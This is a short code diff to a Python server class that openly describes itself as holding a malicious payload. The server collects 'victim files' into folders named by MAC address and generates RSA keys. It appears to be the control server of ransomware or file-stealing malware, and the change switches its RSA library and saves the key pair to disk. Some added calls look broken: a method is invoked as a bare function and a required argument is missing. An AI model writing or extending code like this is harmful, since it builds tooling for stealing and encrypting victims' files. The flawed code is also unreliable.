@@ -12,7 +12,7 @@ import subprocess
 import errno
 import time
 from getmac import get_mac_address
-from cryptography.hazmat.primitives.asymmetric import rsa
+import rsa
 
 class Server:
     """ This class represents a server that stores some malicious payload and sends
@@ -67,15 +67,13 @@ class Server:
         os.mkdir(path)
 
     def generate_key_pair(self):
-        private_key = rsa.generate_private_key(
-            public_exponent=65537,
-            key_size=2048
-        )
+        public_key, private_key = rsa.newkeys(2048)
 
-        # Get the public key from the private key
-        public_key = private_key.public_key()
-    
-        return private_key, public_key
+        with open(Server.WORKING_DIR + '/public.pem', 'wb') as f:
+            f.write(public_key.save_pkcs1('PEM'))
+
+        with open(Server.WORKING_DIR + '/private.pem', 'wb') as f:
+            f.write(private_key.save_pkcs1('PEM'))
 
     def receive_victim_files(self, conn, mac):
         path = os.path.join(Server.WORKING_DIR, mac)
@@ -129,6 +127,7 @@ class Server:
                     #key = base64.b64encode('key file'.encode(SERVER.FORMAT))
 
                     #connection.sendall(key)
+                    generate_key_pair(self)
 
                     while not self.TRANSFER_DONE:
                         self.receive_victim_files(connection)
